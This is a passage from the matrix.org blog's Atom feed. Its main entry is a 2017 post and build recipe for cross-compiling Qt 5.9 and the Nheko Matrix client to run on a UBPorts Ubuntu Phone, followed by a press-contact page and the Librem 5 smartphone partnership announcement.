&#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Experiments with Matrix for the Purism Librem5, starring Ubports and Nheko</title>
        <published>2017-09-28T00:00:00+00:00</published>
        <updated>2017-09-28T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/09/28/experiments-with-matrix-on-the-purism-librem5-starring-ubports-and-nheko/" type="text/html"/>
        <id>https://matrix.org/blog/2017/09/28/experiments-with-matrix-on-the-purism-librem5-starring-ubports-and-nheko/</id>
        
        <content type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;TL;DR: If you love FOSS-friendly hardware and if you love Matrix, please &lt;a href=&quot;https:&#x2F;&#x2F;puri.sm&#x2F;shop&#x2F;librem-5&#x2F;&quot;&gt;preorder a Purism Librem5 Matrix-native smartphone&lt;&#x2F;a&gt;, so we can fully bring native Matrix communication to both phones and desktop!&lt;&#x2F;em&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s been just over a month since Purism announced the campaign to fund the &lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;08&#x2F;24&#x2F;the-librem-5-from-purism-a-matrix-native-smartphone&#x2F;&quot;&gt;Matrix-native Librem5 FOSS smartphone&lt;&#x2F;a&gt; - and the campaign is doing pretty well, with 54% of its target reached as of the time of writing!  So in a shameless attempt to whet everyone&#x27;s appetite and &lt;a href=&quot;https:&#x2F;&#x2F;puri.sm&#x2F;shop&#x2F;librem-5&#x2F;&quot;&gt;encourage everyone to fund the remaining 50%&lt;&#x2F;a&gt;, we thought we&#x27;d share some of the experiments we&#x27;ve been doing with running native Matrix clients on a pure Linux phone.&lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately the Librem5 doesn&#x27;t exist yet, but we do happen to have an &lt;a href=&quot;https:&#x2F;&#x2F;store.bq.com&#x2F;en&#x2F;ubuntu-edition-e5&#x2F;&quot;&gt;BQ Aquaris E5 Ubuntu Phone&lt;&#x2F;a&gt; hanging around - so we wondered: Is it possible to run a native desktop Matrix client like mujx&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mujx&#x2F;nheko&quot;&gt;Nheko&lt;&#x2F;a&gt; on a Linux phone, given all the latest Qt voodoo? And just how hard is it anyway to update the Qt platform abstractions (or GTK for that matter) for a given platform?  In retrospect, we probably should have just run &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;LarreaMikel&#x2F;uMatriks&quot;&gt;uMatriks&lt;&#x2F;a&gt; on it - a proper dedicated Ubuntu Touch Matrix Client, but then we wouldn&#x27;t have had a useful tour of maintaining the guts of a Qt distribution on mobile :)&lt;&#x2F;p&gt;
&lt;p&gt;So the core problem of running a client like Nheko on Ubuntu Touch is that it uses lots of fun glossy stuff from Qt 5.9, whereas Ubuntu Touch is still on Qt 5.4, which is over 2 years old now.  Also, it&#x27;s been written as a desktop client so needs a bit of tuning to support a &#x27;fat-finger&#x27; mobile form factor, although this is just a simple matter of programming and is a very similar problem to ensuring the desktop app has a nice responsive design on small screen window sizes (similar to how the telegram desktop client handles it).  In the end, we focused on solving the Qt problem: building a custom Qt 5.9 for &lt;a href=&quot;https:&#x2F;&#x2F;ubports.com&quot;&gt;Ubports&lt;&#x2F;a&gt; (the community project who do a fantastic job of continuing Ubuntu Touch development since Canonical pulled out), while for simplicity building it on top of the current ubports distribution (which is effectively still Ubuntu 15.04).  The reason for all this Ubuntu stuff rather than using PureOS is simply that it&#x27;s not far enough along, and we don&#x27;t physically have a Librem5 dev kit yet to play with!&lt;&#x2F;p&gt;
&lt;p&gt;In practice, this has been a fascinating process: setting up a crosscompiler to build all of Qt5.9, and then porting the ubuntumirclient Qt Platform Abstraction to work with Qt5.9, as well as (finally) working out how to build a Qt5.9-compatible custom Maliit input context platform plugin to get the onscreen keyboard (OSK) up and running.  But we got there in the end, and it was rather fun to finally see the Nheko splash screen popping up on the Aquaris E5! :D&lt;&#x2F;p&gt;
&lt;img class=&quot;aligncenter size-large wp-image-2833&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;nheko1-768x1024.jpeg&quot; alt=&quot;&quot; width=&quot;432&quot; height=&quot;768&quot; &#x2F;&gt;
&lt;p&gt;There was then a bit of a nightmare to get the OSK to work, thanks to&lt;a href=&quot;https:&#x2F;&#x2F;bugreports.qt.io&#x2F;browse&#x2F;QTBUG-46009&quot;&gt; https:&#x2F;&#x2F;bugreports.qt.io&#x2F;browse&#x2F;QTBUG-46009&lt;&#x2F;a&gt; causing the plugin to be silently not updated - but could then log in and the app worked great (albeit a bit slow thanks to being a debug build on the energy-efficient but slow Mediatek MT6582 SoC):&lt;&#x2F;p&gt;
&lt;div style=&quot;text-align: center;&quot;&gt;&lt;img class=&quot;size-large wp-image-2834&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;screenshot20170928_131924004-576x1024.png&quot; alt=&quot;&quot; width=&quot;288&quot; height=&quot;512&quot; &#x2F;&gt; &lt;img class=&quot;size-large wp-image-2835&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;screenshot20170928_132210382-576x1024.png&quot; alt=&quot;&quot; width=&quot;288&quot; height=&quot;512&quot; &#x2F;&gt; &lt;img class=&quot;size-large wp-image-2836&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;screenshot20170928_131057113-576x1024.png&quot; alt=&quot;&quot; width=&quot;288&quot; height=&quot;512&quot; &#x2F;&gt; &lt;img class=&quot;size-large wp-image-2837&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;09&#x2F;screenshot20170928_132238278-576x1024.png&quot; alt=&quot;&quot; width=&quot;288&quot; height=&quot;512&quot; &#x2F;&gt;&lt;&#x2F;div&gt;
Now the next step here would obviously be to tweak the app properly to layout on a phone (bigger fonts; bigger buttons; resize the window to make room for the OSK; separate the Left Panel from the timeline view; etc) - but the point here was more to show a fully fledged native Matrix client running on a current Linux Phone environment and see how it feels.  And we&#x27;re happy to say that it leaves us dying to get our hands on a proper Librem5 so we can work with Nheko, uMatriks, libqmatrixclient and all the other native Matrix client projects to see how we can get the best possible native client experience running in PureOS for the phone!!
&lt;p&gt;Finally, there doesn&#x27;t seem to be much documentation out there on how to do a heavy customisation of Ubports like this, so for the sake of posterity, here&#x27;s the guide if anyone else is crazy enough to try this (or for when Ubports gets around to doing an official update to Qt 5.9 for their OS!).  A versioned copy of this lives over at &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;ara4n&#x2F;4a4076b8fd5a61153bde6c9a0a726c72&quot;&gt;this gist&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Thanks for reading, and don&#x27;t forget to preorder!&lt;&#x2F;p&gt;
&lt;p&gt;Matthew&lt;&#x2F;p&gt;
&lt;h3 id=&quot;recipe-librem5-experiments-with-an-ubuntu-phone-and-nheko&quot;&gt;Recipe: Librem5 experiments with an Ubuntu Phone and Nheko&lt;&#x2F;h3&gt;
&lt;p&gt;Starting point: one old BQ Aquaris E5 ubuntu phone, running some old version of Ubuntu Touch which had got completely stuck (UI only unfreezing for 2-3 seconds every 2-3 minutes).&lt;&#x2F;p&gt;
&lt;p&gt;Step one: flash to latest UBPorts image:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Set up Ubuntu desktop as a host (as per &lt;a href=&quot;https:&#x2F;&#x2F;docs.ubuntu.com&#x2F;phone&#x2F;en&#x2F;devices&#x2F;installing-ubuntu-for-devices&quot;&gt;https:&#x2F;&#x2F;docs.ubuntu.com&#x2F;phone&#x2F;en&#x2F;devices&#x2F;installing-ubuntu-for-devices&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre&gt;&lt;code&gt;sudo add-apt-repository ppa:ubuntu-sdk-team&#x2F;ppa
sudo apt-get update
sudo apt-get install ubuntu-device-flash
sudo apt-get install phablet-tools
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
 	&lt;li&gt;Grab an adb-compatible recovery image (yes, seems like the right place is someone&#x27;s personal webspace...)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre&gt;&lt;code&gt;wget http:&#x2F;&#x2F;people.canonical.com&#x2F;~jhm&#x2F;barajas&#x2F;recovery-vegetahd.img
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
 	&lt;li&gt;If your Ubuntu desktop is running in a VM, make sure you have USB 2.0 or 3.0 support enabled (in Virtualbox this needs the extension pack installed). USB 1 is too slow and the flash will timeout, semi-bricking the phone.&lt;&#x2F;li&gt;
 	&lt;li&gt;Press volume-up and power on the phone during boot to get at the bootloader. Make sure it&#x27;s not plugged into USB&lt;&#x2F;li&gt;
 	&lt;li&gt;Select fastboot&lt;&#x2F;li&gt;
 	&lt;li&gt;Plug into USB&lt;&#x2F;li&gt;
 	&lt;li&gt;Flash the recovery image and latest UBPorts OS:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre&gt;&lt;code&gt;sudo ubuntu-device-flash --server=http:&#x2F;&#x2F;system-image.ubports.com touch --device=vegetahd \\
                         --channel=15.04&#x2F;stable --bootstrap --recovery-image=recovery-vegetahd.img \\
                         --developer-mode --password=secret
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
 	&lt;li&gt;Ensure the system OS is writable. (Ubuntu Touch runs the OS partition read-only by default to protect users. In this case, you can always re-flash it if all goes wrong.)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre&gt;&lt;code&gt;sudo phablet-config writable-image
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
 	&lt;li&gt;Get an SSH server running on the phone before you go insane&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre&gt;&lt;code&gt;adb shell
sudo &#x2F;etc&#x2F;init.d&#x2F;ssh start # password is as set when flashing.
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
Step two: cross-compile latest Qt 5.9 for the phone.
&lt;p&gt;Ubuntu 15.04 shipped with 5.4, which is pretty old now, and too old for nheko. Based on &lt;a href=&quot;https:&#x2F;&#x2F;rm5248.com&#x2F;cross-compile-qt-for-arm&#x2F;&quot;&gt;https:&#x2F;&#x2F;rm5248.com&#x2F;cross-compile-qt-for-arm&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre&gt;&lt;code&gt;# grab the source for Qt5
git clone git:&#x2F;&#x2F;code.qt.io&#x2F;qt&#x2F;qt5.git
cd qt5
.&#x2F;init-repository

# grab the right dev headers (as qtubuntu needs dbus &amp; atspi support)
ssh phablet@phone &quot;sudo apt-get install libdbus-1-dev libatspi2.0-dev libssl-dev&quot;

# grab a copy of the root filesystem on the phone for the cross-compile to run against.
# you could also sshfs mount or something if you could be bothered.
mkdir ~&#x2F;phone
rsync -avz --exclude &#x2F;proc --exclude &#x2F;run --exclude &#x2F;sys --exclude &#x2F;dev \\
           --exclude &#x2F;android --exclude &#x2F;var&#x2F;lib&#x2F;lxc phablet@phone:&#x2F; ~&#x2F;phone&#x2F;system
export ROOTFS=~&#x2F;phone

# install the crosscompiler.
# We probably have to use GCC 4.9 so that it can link ok against the older system libraries
# (libstdc++ etc) on Ubuntu Touch 15.04
sudo apt-get install arm-linux-gnueabihf-g++-4.9

# fix up the absolute symlinks (important!)
cd ~
git clone https:&#x2F;&#x2F;github.com&#x2F;rm5248&#x2F;cross-compile-tools.git
.&#x2F;cross-compile-tools&#x2F;fixQualifiedLibraryPaths $ROOTFS &#x2F;usr&#x2F;bin&#x2F;arm-linux-gnueabihf-g++-4.9

# define a mkspec target for armhf
cd ~&#x2F;qt5
cp -a qtbase&#x2F;mkspecs&#x2F;linux-arm-gnueabi-g++ qtbase&#x2F;mkspecs&#x2F;linux-arm-gnueabihf-g++
cat &amp;gt; qtbase&#x2F;mkspecs&#x2F;linux-arm-gnueabihf-g++&#x2F;qmake.conf &amp;lt;&amp;lt;EOT
#
# qmake configuration for building with arm-linux-gnueabihf-g++
#

MAKEFILE_GENERATOR      = UNIX
CONFIG                 += incremental
QMAKE_INCREMENTAL_STYLE = sublib

include(..&#x2F;common&#x2F;linux.conf)
include(..&#x2F;common&#x2F;gcc-base-unix.conf)
include(..&#x2F;common&#x2F;g++-unix.conf)

# modifications to g++.conf
QMAKE_CC                = arm-linux-gnueabihf-gcc-4.9
QMAKE_CXX               = arm-linux-gnueabihf-g++-4.9
QMAKE_LINK              = arm-linux-gnueabihf-g++-4.9
QMAKE_LINK_SHLIB        = arm-linux-gnueabihf-g++-4.9

# modifications to linux.conf
QMAKE_AR                = arm-linux-gnueabihf-ar cqs
QMAKE_OBJCOPY           = arm-linux-gnueabihf-objcopy
QMAKE_NM                = arm-linux-gnueabihf-nm -P
QMAKE_STRIP             = arm-linux-gnueabihf-strip

!host_build {&#x27;{&#x27;}
        QMAKE_INCDIR_OPENGL     = $ROOTFS&#x2F;usr&#x2F;include&#x2F;GL
        QMAKE_LIBDIR_OPENGL     = $ROOTFS&#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf
        # GCC 4.9 apparently doesn&#x27;t know where its own libstdc++ headers are when cross-compiling...
        QMAKE_INCDIR            = &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;include&#x2F;c++&#x2F;4.9.3 \\
                                  &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;include&#x2F;c++&#x2F;4.9.3&#x2F;arm-linux-gnueabihf
{&#x27;}&#x27;}

load(qt_config)
EOT

# build it!
.&#x2F;configure \\
    -v \\
    -confirm-license \\
    -prefix &#x2F;opt&#x2F;qt5-arm \\
    -sysroot $ROOTFS \\
    -opensource \\
    -nomake examples \\
    -nomake tests \\
    -opengl es2 \\
    -qpa ubuntumirclient \\
    -xplatform linux-arm-gnueabihf-g++ \\
    -platform linux-g++ \\
    -feature-accessibility \\
    -feature-accessibility-atspi-bridge \\
    -feature-webrtc \\
    -feature-proprietary-codecs \\
    -reduce-exports

make -j8

# go to lunch

make install
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If anything goes wrong, a good bet (having backed up your new mkspec target) is to git clean everything:&lt;&#x2F;p&gt;
&lt;pre&gt;&lt;code&gt;git submodule foreach --recursive &quot;git clean -dfx&quot;
git clean -dfx
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Step 3: compile qtubuntu for Ubuntu-specific Qt stuff like the integration with the Mir display server (hey, at this point it feels like we&#x27;re building our very own zombie Ubuntu Touch 17.04... :&#x2F;)&lt;&#x2F;p&gt;
&lt;pre&gt;&lt;code&gt;# grab dev package deps
ssh phablet@phone &quot;sudo apt-get install libubuntu-application-api-dev libudev-dev&quot;
rsync -avz --exclude &#x2F;proc --exclude &#x2F;run --exclude &#x2F;sys --exclude &#x2F;dev \\
           --exclude &#x2F;android --exclude &#x2F;var&#x2F;lib&#x2F;lxc phablet@phone:&#x2F; ~&#x2F;phone&#x2F;system
~&#x2F;cross-compile-tools&#x2F;fixQualifiedLibraryPaths $ROOTFS &#x2F;usr&#x2F;bin&#x2F;arm-linux-gnueabihf-g++-4.9

# grab the qtubuntu source
bzr branch lp:qtubuntu

# find an version old enough that it builds against the old mir in 15.04
bzr revert -r 345

# cherrypick patches so it builds against qt 5.9...
http:&#x2F;&#x2F;bazaar.launchpad.net&#x2F;~phablet-team&#x2F;qtubuntu&#x2F;trunk&#x2F;revision&#x2F;354
http:&#x2F;&#x2F;bazaar.launchpad.net&#x2F;~phablet-team&#x2F;qtubuntu&#x2F;trunk&#x2F;revision&#x2F;372
http:&#x2F;&#x2F;bazaar.launchpad.net&#x2F;~phablet-team&#x2F;qtubuntu&#x2F;trunk&#x2F;revision&#x2F;394
# ...we probably need others too.

&#x2F;mnt&#x2F;build&#x2F;qt5&#x2F;qtbase&#x2F;bin&#x2F;qmake -spec &#x2F;mnt&#x2F;build&#x2F;qt5&#x2F;qtbase&#x2F;mkspecs&#x2F;linux-arm-gnueabihf-g++

# we probably should have told Qt about more pkgconfig libraries when we built it, so as to not have to do it manually here...
export PKG_CONFIG_LIBDIR=$ROOTFS&#x2F;usr&#x2F;lib&#x2F;pkgconfig:$ROOTFS&#x2F;usr&#x2F;share&#x2F;pkgconfig:\\
$ROOTFS&#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;pkgconfig&#x2F;:$ROOTFS&#x2F;opt&#x2F;qt5-arm&#x2F;lib&#x2F;pkgconfig&#x2F;
export PKG_CONFIG_SYSROOT_DIR=$ROOTFS

# might need to manually explicitify the --sysroot definitions in qt&#x27;s qconfig.pri
# as otherwise QT_SYSROOT seems not to be getting picked up for reasons unknown

make -j4
cp src&#x2F;ubuntumirclient&#x2F;libqpa-ubuntumirclient.so $ROOTFS&#x2F;opt&#x2F;qt5-arm&#x2F;plugins&#x2F;platforms&#x2F;

# Need to build our own libmaliitphabletplatforminputcontextplugin.so for onscreen keyboard, as
# you can&#x27;t mix Qt platform plugins between versions - see https:&#x2F;&#x2F;bugreports.qt.io&#x2F;browse&#x2F;QTBUG-46009
cd
bzr branch lp:ubuntu&#x2F;vivid&#x2F;maliit-framework
cd maliit-framework
# add QMAKE_LFLAGS+=&#x27;-lQt5Network -lGLESv2&#x27; to config.pri

# technically don&#x27;t need to build all of maliit - only the platform inputcontext plugin is required
export QMAKEMODULES=&#x2F;mnt&#x2F;build&#x2F;qt5&#x2F;qtdeclarative&#x2F;mkspecs&#x2F;modules 
&#x2F;mnt&#x2F;build&#x2F;qt5&#x2F;qtbase&#x2F;bin&#x2F;qmake -spec &#x2F;mnt&#x2F;build&#x2F;qt5&#x2F;qtbase&#x2F;mkspecs&#x2F;linux-arm-gnueabihf-g++
make -j4

# build the input-context plugin
cd input-context
# change the version of the plugin in main.cpp so that it&#x27;s picked up by Qt 5.9 (the API hasn&#x27;t changed;
# it&#x27;s just the difference between an explicit and implicit version):
# Q_PLUGIN_METADATA(IID &quot;org.qt-project.Qt.QPlatformInputContextFactoryInterface.5.1&quot; FILE &quot;maliit.json&quot;)
&#x2F;mnt&#x2F;build&#x2F;qt5&#x2F;qtbase&#x2F;bin&#x2F;qmake -spec &#x2F;mnt&#x2F;build&#x2F;qt5&#x2F;qtbase&#x2F;mkspecs&#x2F;linux-arm-gnueabihf-g++

make -j4
make install

# rsync our beautiful new Qt5.9 over to the phone, including the qtubuntu plugin
rsync -avz $ROOTFS&#x2F;opt&#x2F;qt5-arm root@phone:&#x2F;opt&#x2F;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Step 4: cross-compile nheko as an experiment&lt;&#x2F;p&gt;
&lt;pre&gt;&lt;code&gt;# check it out
git clone --recursive git+ssh:&#x2F;&#x2F;git@github.com&#x2F;mujx&#x2F;nheko
cd nheko

# define a cross-compile toolchain (https:&#x2F;&#x2F;cmake.org&#x2F;Wiki&#x2F;CMake_Cross_Compiling)
cat &amp;gt; Toolchain-arm-linux-gnueabihf.cmake &amp;lt;&amp;lt;EOT
# this one is important
SET(CMAKE_SYSTEM_NAME Linux)
# this one not so much
SET(CMAKE_SYSTEM_VERSION 1)
# needed to get the right flavour of ARM
SET(CMAKE_SYSTEM_PROCESSOR armv7)

# specify the cross compiler
SET(CMAKE_C_COMPILER   &#x2F;usr&#x2F;bin&#x2F;arm-linux-gnueabihf-gcc-4.9)
SET(CMAKE_CXX_COMPILER &#x2F;usr&#x2F;bin&#x2F;arm-linux-gnueabihf-g++-4.9)

# where is the target environment
SET(CMAKE_SYSROOT  $ROOTFS)
SET(CMAKE_FIND_ROOT_PATH  $ROOTFS)

# sort out our includes...
SET(CMAKE_CXX_FLAGS &quot;${&#x27;{&#x27;}CMAKE_CXX_FLAGS{&#x27;}&#x27;} \\
    -I$ROOTFS&#x2F;usr&#x2F;include&#x2F;c++&#x2F;4.9 \\
    -I$ROOTFS&#x2F;usr&#x2F;include&#x2F;arm-linux-gnueabihf \\
    -I$ROOTFS&#x2F;usr&#x2F;include&#x2F;arm-linux-gnueabihf&#x2F;c++&#x2F;4.9&quot;)

SET(CMAKE_EXE_LINKER_FLAGS &quot;${&#x27;{&#x27;}CMAKE_EXE_LINKER_FLAGS{&#x27;}&#x27;} \\
  $ROOTFS&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libc.so.6 \\
  $ROOTFS&#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libm.so \\
  $ROOTFS&#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;libhybris-egl&#x2F;libGLESv2.so.2&quot;)

# search for programs in the build host directories
SET(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)
# for libraries and headers in the target directories
SET(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)
SET(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)

SET(CMAKE_PREFIX_PATH $ROOTFS&#x2F;opt&#x2F;qt5-arm)
EOT

# grab its dependencies on the phone and sync them over to your local phone FS copy
ssh phablet@phone &#x27;sudo apt-get install liblmdb-dev&#x27;
rsync -avz --exclude &#x2F;proc --exclude &#x2F;run --exclude &#x2F;sys --exclude &#x2F;dev \\
           --exclude &#x2F;android --exclude &#x2F;var&#x2F;lib&#x2F;lxc phablet@phone:&#x2F; ~&#x2F;phone&#x2F;system
~&#x2F;cross-compile-tools&#x2F;fixQualifiedLibraryPaths $ROOTFS &#x2F;usr&#x2F;bin&#x2F;arm-linux-gnueabihf-g++-4.9

# gen the makefile
sudo apt-get install cmake
cmake -DLMDB_LIBRARY=$ROOTFS&#x2F;usr&#x2F;lib&#x2F;arm-linux-gnueabihf&#x2F;liblmdb.so \\
      -DCMAKE_TOOLCHAIN_FILE=`pwd`&#x2F;Toolchain-arm-linux-gnueabihf.cmake \\
      -H. -Bbuild -DCMAKE_BUILD_TYPE=Release
# remove -march=native from CMakeLists.txt

# build it
VERBOSE=1 make -C build -j4

# XXX: you might need to touch the Toolchain file and then run again to pick up
# the CXX_FLAGS correctly for some reason.

# run it!
rsync -avz $ROOTFS&#x2F;home&#x2F;phablet&#x2F;nheko phablet@phone:&#x2F;home&#x2F;phablet
ssh phablet@phone &quot;export MIR_SOCKET=&#x2F;run&#x2F;user&#x2F;32011&#x2F;mir_socket;
                   .&#x2F;build&#x2F;nheko --desktop_file_hint=unity8&quot;

# N.B. if debugging under gdb, use `handle SIGILL nostop`
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Step 5: Package nheko&lt;&#x2F;p&gt;
&lt;pre&gt;&lt;code&gt;# make sure you have a manifest.json, nheko.png, nheko.apparmor and nheko.desktop.
# If you don&#x27;t have an icon, the app won&#x27;t show up.
# you can grab it from the matthew&#x2F;mobile branch of github.com&#x2F;matrix-org&#x2F;nheko
click build .&#x2F;
scp im.vector.nheko_0.1_all.click phablet@phone:

# install it
ssh phablet@phone pkcon install-local --allow-untrusted im.vector.nheko_0.1_all.click

# ...and then swipe down on the app listing to hopefully see the app there.
# if that doesn&#x27;t work, you can manually launch it with:
ssh phablet@phone ubuntu-app-launch im.vector.nheko_nheko_0.1&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>PR</title>
        <published>2017-08-30T00:00:00+00:00</published>
        <updated>2017-08-30T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/08/30/pr/" type="text/html"/>
        <id>https://matrix.org/blog/2017/08/30/pr/</id>
        
        <content type="html">&lt;h2 id=&quot;press-media-contact&quot;&gt;Press&#x2F;Media Contact&lt;&#x2F;h2&gt;
&lt;p&gt;You can reach us by email at &lt;a href=&quot;mailto:pr@matrix.org&quot;&gt;pr@matrix.org&lt;&#x2F;a&gt;, or reach &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&#x2F;develop&#x2F;#&#x2F;user&#x2F;@matthew:matrix.org?action=chat&quot;&gt;Matthew&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;riot.im&#x2F;develop&#x2F;#&#x2F;user&#x2F;@amandine:matrix.org?action=chat&quot;&gt;Amandine&lt;&#x2F;a&gt; on Matrix via Riot.im (or your favourite Matrix client).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;who-is-matrix-org&quot;&gt;Who is Matrix.org?&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix.org is the world leader in decentralised encrypted communication, with project lead Matthew Hodgson a regular speaker at conferences such as FOSDEM and decentralisation&#x2F;privacy summits. In Sept 2016 Matrix released the world&#x27;s first ever publicly audited end-to-end encryption “Olm”, based on the Double Ratchet Algorithm.&lt;&#x2F;p&gt;
&lt;p&gt;Matrix core team is based in London (UK) and Rennes (France).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;branding-identity&quot;&gt;Branding Identity&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;logos&#x2F;raw&#x2F;master&#x2F;matrix&#x2F;matrix-logo.png&quot;&gt;&lt;img class=&quot;alignnone size-medium&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;logos&#x2F;raw&#x2F;master&#x2F;matrix&#x2F;matrix-logo.png&quot; width=&quot;300&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;em&gt;Matrix logo, black on transparent background, PNG format (also available in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;logos&#x2F;raw&#x2F;master&#x2F;matrix&#x2F;matrix-logo.svg&quot;&gt;SVG&lt;&#x2F;a&gt;)&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;span style=&quot;padding-left: 3px; padding-right: 3px; background: black; display: inline-block;&quot;&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;logos&#x2F;raw&#x2F;master&#x2F;matrix&#x2F;matrix-logo-white.png&quot;&gt;&lt;img class=&quot;alignnone size-medium&quot; src=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;logos&#x2F;raw&#x2F;master&#x2F;matrix&#x2F;matrix-logo-white.png&quot; width=&quot;300&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;span&gt;
&lt;p&gt;&lt;em&gt;Matrix logo, white on transparent background, PNG format&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Librem 5 from Purism: A Matrix Native Smartphone.</title>
        <published>2017-08-24T00:00:00+00:00</published>
        <updated>2017-08-24T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/08/24/the-librem-5-from-purism-a-matrix-native-smartphone/" type="text/html"/>
        <id>https://matrix.org/blog/2017/08/24/the-librem-5-from-purism-a-matrix-native-smartphone/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;This is a big news week in Matrixland: hot on the heels of releasing &lt;a href=&quot;&#x2F;blog&#x2F;2017&#x2F;08&#x2F;23&#x2F;introducing-matrix-widgets&#x2F;&quot;&gt;Matrix Widgets and Riot 0.12&lt;&#x2F;a&gt;, we have another massive announcement to make!&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve been approached by &lt;a href=&quot;https:&#x2F;&#x2F;puri.sm&quot;&gt;Purism&lt;&#x2F;a&gt; to partner up to provide the communications subsystem for their upcoming Librem 5 smartphone - for which they are &lt;a href=&quot;https:&#x2F;&#x2F;puri.sm&#x2F;shop&#x2F;librem-5&#x2F;&quot;&gt;launching a crowdfunding campaign&lt;&#x2F;a&gt; starting today! The whole idea of the phone is to provide unprecedented privacy, security and autonomy by running an entirely FOSS Debian-based GNU&#x2F;Linux stack (even including CPU &amp;amp; GPU drivers!), and we are incredibly proud and overexcited that the folks at &lt;strong&gt;Purism have asked the Matrix core team to provide the native dialler and messaging app for the phone&lt;&#x2F;strong&gt;.  Yes, this means that the phone will literally boot by default into Matrix for all its primary communications (although, being FOSS, you could of course use a different dialler if you wanted).  The intention is to be a very usable and flexible phone for folks who value freedom, privacy and simplicity over the (relative) quagmire of iOS or Android - and of course jumping way ahead of where Apple or Google are in terms of integrating next-generation communications into the very heart of the device.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;puri.sm&#x2F;shop&#x2F;librem-5&#x2F;&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-2756&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;purism5.png&quot; alt=&quot;&quot; width=&quot;1100&quot; height=&quot;720&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
